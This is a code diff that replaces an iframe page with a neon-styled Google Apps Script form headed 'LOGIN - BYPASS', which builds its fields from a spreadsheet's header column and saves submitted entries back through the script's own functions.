@@ -1,29 +1,458 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>xxxxx</title>
-<base target="_top">
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <base target="_top">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
+    
+    :root {
+      --primary-cyan: #00ffff;
+      --primary-purple: #8b5cf6;
+      --primary-blue: #0066ff;
+      --dark-bg: #0a0a0f;
+      --card-bg: rgba(15, 15, 25, 0.8);
+      --glass-bg: rgba(255, 255, 255, 0.05);
+      --border-glow: rgba(0, 255, 255, 0.3);
+      --text-primary: #ffffff;
+      --text-secondary: #a0a0a0;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Orbitron', monospace;
+      background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 50%, #16213e 100%);
+      min-height: 100vh;
+      margin: 0;
+      padding: 20px;
+      color: var(--text-primary);
+      position: relative;
+      overflow-x: hidden;
+    }
+    
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: 
+        radial-gradient(circle at 20% 20%, rgba(0, 255, 255, 0.1) 0%, transparent 50%),
+        radial-gradient(circle at 80% 80%, rgba(139, 92, 246, 0.1) 0%, transparent 50%),
+        radial-gradient(circle at 40% 60%, rgba(0, 102, 255, 0.05) 0%, transparent 50%);
+      pointer-events: none;
+      z-index: -1;
+    }
+
+    .container {
+      width: 90%;
+      max-width: 700px;
+      margin: 0 auto;
+      padding: 40px;
+      background: var(--card-bg);
+      border-radius: 20px;
+      border: 1px solid var(--border-glow);
+      box-shadow: 
+        0 0 50px rgba(0, 255, 255, 0.2),
+        inset 0 0 50px rgba(255, 255, 255, 0.02);
+      backdrop-filter: blur(10px);
+      position: relative;
+    }
+
+    .container::before {
+      content: '';
+      position: absolute;
+      top: -2px;
+      left: -2px;
+      right: -2px;
+      bottom: -2px;
+      background: linear-gradient(45deg, var(--primary-cyan), var(--primary-purple), var(--primary-blue));
+      border-radius: 22px;
+      z-index: -1;
+      opacity: 0.5;
+      animation: borderGlow 3s ease-in-out infinite alternate;
+    }
+
+    @keyframes borderGlow {
+      0% { opacity: 0.3; }
+      100% { opacity: 0.8; }
+    }
+
+    .logo {
+      display: block;
+      width: 120px;
+      height: 120px;
+      border-radius: 50%;
+      margin: 0 auto 30px auto;
+      border: 3px solid var(--primary-cyan);
+      box-shadow: 
+        0 0 30px rgba(0, 255, 255, 0.5),
+        inset 0 0 30px rgba(0, 255, 255, 0.1);
+      object-fit: cover;
+      animation: logoFloat 4s ease-in-out infinite;
+    }
+
+    @keyframes logoFloat {
+      0%, 100% { transform: translateY(0px); }
+      50% { transform: translateY(-10px); }
+    }
+
+    h1 {
+      text-align: center;
+      font-size: 2.2em;
+      font-weight: 900;
+      margin: 0 0 40px 0;
+      background: linear-gradient(45deg, var(--primary-cyan), var(--primary-purple));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      text-shadow: 0 0 20px rgba(0, 255, 255, 0.5);
+      animation: titleGlow 2s ease-in-out infinite alternate;
+    }
+
+    @keyframes titleGlow {
+      0% { filter: brightness(1); }
+      100% { filter: brightness(1.2); }
+    }
+
+    .form-group {
+      margin-bottom: 25px;
+      position: relative;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 12px;
+      font-weight: 700;
+      color: var(--primary-cyan);
+      font-size: 0.9em;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+    }
+
+    input[type="text"],
+    input[type="email"],
+    input[type="tel"],
+    textarea {
+      width: 100%;
+      padding: 18px 20px;
+      border: 2px solid transparent;
+      border-radius: 12px;
+      background: var(--glass-bg);
+      backdrop-filter: blur(5px);
+      font-size: 1em;
+      color: var(--text-primary);
+      outline: none;
+      font-family: 'Orbitron', monospace;
+      transition: all 0.3s ease;
+    }
+
+    input:focus,
+    textarea:focus {
+      border-color: var(--primary-cyan);
+      box-shadow: 
+        0 0 20px rgba(0, 255, 255, 0.3),
+        inset 0 0 20px rgba(0, 255, 255, 0.1);
+      transform: translateY(-2px);
+    }
+
+    input::placeholder,
+    textarea::placeholder {
+      color: var(--text-secondary);
+      opacity: 0.7;
+    }
+
+    button {
+      width: 100%;
+      padding: 20px;
+      border: none;
+      border-radius: 12px;
+      background: linear-gradient(45deg, var(--primary-cyan), var(--primary-purple));
+      font-size: 1.2em;
+      font-weight: 700;
+      color: var(--dark-bg);
+      cursor: pointer;
+      font-family: 'Orbitron', monospace;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
+    }
+
+    button::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+      transition: left 0.5s ease;
+    }
+
+    button:hover::before {
+      left: 100%;
+    }
+
+    button:hover {
+      transform: translateY(-3px);
+      box-shadow: 
+        0 10px 30px rgba(0, 255, 255, 0.4),
+        0 0 50px rgba(139, 92, 246, 0.3);
+    }
+
+    button:active, button.loading {
+      transform: translateY(0);
+      box-shadow: 
+        0 5px 15px rgba(0, 255, 255, 0.3),
+        inset 0 0 20px rgba(0, 0, 0, 0.2);
+    }
+
+    #loader {
+      text-align: center;
+      padding: 40px;
+      font-style: italic;
+      color: var(--primary-cyan);
+      font-size: 1.1em;
+      animation: pulse 2s ease-in-out infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 0.5; }
+      50% { opacity: 1; }
+    }
+
+    #status-dialog {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.8);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+      backdrop-filter: blur(5px);
+    }
+
+    .dialog-content {
+      padding: 40px;
+      background: var(--card-bg);
+      border-radius: 20px;
+      border: 2px solid var(--primary-cyan);
+      box-shadow: 
+        0 0 50px rgba(0, 255, 255, 0.4),
+        inset 0 0 50px rgba(255, 255, 255, 0.05);
+      text-align: center;
+      max-width: 80%;
+      backdrop-filter: blur(10px);
+      animation: dialogAppear 0.3s ease-out;
+    }
+
+    @keyframes dialogAppear {
+      0% { 
+        opacity: 0;
+        transform: scale(0.8) translateY(-20px);
+      }
+      100% { 
+        opacity: 1;
+        transform: scale(1) translateY(0);
+      }
+    }
+
+    .dialog-content h2 {
+      margin-top: 0;
+      color: var(--primary-cyan);
+      font-weight: 900;
+      font-size: 1.5em;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+    }
+
+    .dialog-content p {
+      color: var(--text-primary);
+      font-size: 1.1em;
+      line-height: 1.6;
+    }
+
+    .dialog-content button {
+      margin-top: 25px;
+      width: auto;
+      padding: 15px 40px;
+      font-size: 1em;
+    }
+
+    @media (max-width: 600px) {
+      .container {
+        padding: 30px 20px;
+      }
+      
+      h1 {
+        font-size: 1.8em;
+      }
+      
+      .logo {
+        width: 100px;
+        height: 100px;
+      }
+    }
+  </style>  <link href="https://fonts.googleapis.com/css2?family=Prompt:wght@400;600&display=swap" rel="stylesheet">
+</head>
+<body>
+  <div class="container">
+    
+    <!-- =========================================== LOGO ADDED HERE ================================================= -->
+    <img src="https://img5.pic.in.th/file/secure-sv1/1icon.th.jpeg" alt="Logo" class="logo">
+    <!-- ============================== CHANGE TEXT Header BTN HERE ==================================================== -->
+    <h1>LOGIN - BYPASS</h1>
+    <form id="applicationForm">
+      <div id="form-fields">
+        <div id="loader">loading...</div>
+      </div>
+      <!-- ============================== CHANGE TEXT SUBMIT BTN HERE ==================================================== -->
+      <button type="submit" id="submitBtn">LOGIN</button>
+    </form>
+  </div>
 </head>
 
-<div align="center">
-<iframe src="https://script.google.com/macros/s/AKfycby1fmb6zQ1YyoVaek36p51vl9drxyIdbzlaHVEDxNsHZdEBh7eL5UPv6DwBRaz6zrSh/exec" 
+  <!-- Status Dialog Box -->
+  <div id="status-dialog">
+    <div class="dialog-content">
+      <h2 id="dialog-title">Status</h2>
+      <p id="dialog-message"></p>
+      <button id="closeDialogBtn">Close</button>
+    </div>
+  </div>
 
-style="
-    position: fixed;
-    top: 0px;
-    bottom: 0px;
-    right: 0px;
-    width: 100%;
-    border: none;
-    margin: 0;
-    padding: 0;
-    overflow: hidden;
-    z-index: 999999;
-    height: 100%;
-  "></iframe>
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      google.script.run
+        .withSuccessHandler(createFormFields)
+        .withFailureHandler(showError)
+        .getFormHeaders();
+    });
 
-<div>
+    function createFormFields(headers) {
+      if (headers.error) {
+        showError({message: headers.error});
+        return;
+      }
+      const formFieldsDiv = document.getElementById('form-fields');
+      formFieldsDiv.innerHTML = ''; 
+
+      if (headers.length === 0) {
+        formFieldsDiv.innerHTML = '<p style="text-align:center;">No questions found in the "header" sheet. Please add questions to column A.</p>';
+        document.getElementById('submitBtn').style.display = 'none'; 
+        return;
+      }
+
+      headers.forEach((header, index) => {
+        const group = document.createElement('div');
+        group.className = 'form-group';
+
+        const label = document.createElement('label');
+        label.htmlFor = 'field-' + index;
+        label.textContent = header;
+
+        let input;
+        // Check for long questions to use a textarea instead of input
+        if (header.toLowerCase().includes('why') || header.toLowerCase().includes('describe') || header.length > 50) {
+            input = document.createElement('textarea');
+            input.rows = 4;
+        } else {
+            input = document.createElement('input');
+            input.type = 'text';
+            // Simple logic to guess input type
+            
+        }
+
+        input.id = 'field-' + index;
+        input.name = header; 
+        input.required = true;
+        
+        group.appendChild(label);
+        group.appendChild(input);
+        formFieldsDiv.appendChild(group);
+      });
+    }
+
+    function showError(error) {
+      const formFieldsDiv = document.getElementById('form-fields');
+      formFieldsDiv.innerHTML = ''; // Clear the loader
+      showDialog('Error', 'Could not load the form: ' + error.message);
+    }
+
+    // --- Handle form submission ---
+    const form = document.getElementById('applicationForm');
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const submitBtn = document.getElementById('submitBtn');
+      submitBtn.textContent = 'loading...';
+      submitBtn.classList.add('loading');
+      submitBtn.disabled = true;
+
+      // Create a plain object from form data
+      const formData = new FormData(form);
+      const dataObject = {};
+      formData.forEach((value, key) => {
+        dataObject[key] = value;
+      });
+
+      google.script.run
+        .withSuccessHandler(formSubmitSuccess)
+        .withFailureHandler(formSubmitError)
+        .saveData(dataObject);
+    });
+
+    function formSubmitSuccess(response) {
+      const submitBtn = document.getElementById('submitBtn');
+      submitBtn.textContent = 'LOGIN';
+      submitBtn.classList.remove('loading');
+      submitBtn.disabled = false;
+      
+      form.reset(); // Clear the form fields
+
+      showDialog(response.status.toUpperCase(), response.message);
+    }
+    
+    function formSubmitError(error) {
+       const submitBtn = document.getElementById('submitBtn');
+      submitBtn.textContent = 'LOGIN';
+      submitBtn.classList.remove('loading');
+      submitBtn.disabled = false;
+      
+      showDialog('Error', 'Submission failed: ' + error.message);
+    }
+
+    // --- Dialog Box Logic ---
+    const dialog = document.getElementById('status-dialog');
+    const closeDialogBtn = document.getElementById('closeDialogBtn');
+
+    function showDialog(title, message) {
+      document.getElementById('dialog-title').textContent = title;
+      document.getElementById('dialog-message').textContent = message;
+      dialog.style.display = 'flex';
+    }
+
+    function hideDialog() {
+      dialog.style.display = 'none';
+    }
+    
+    closeDialogBtn.addEventListener('click', hideDialog);
+    // Also hide dialog if user clicks outside the content box
+    dialog.addEventListener('click', function(e) {
+      if (e.target === dialog) {
+        hideDialog();
+      }
+    });
+
+  </script>
 </body>
 </html>
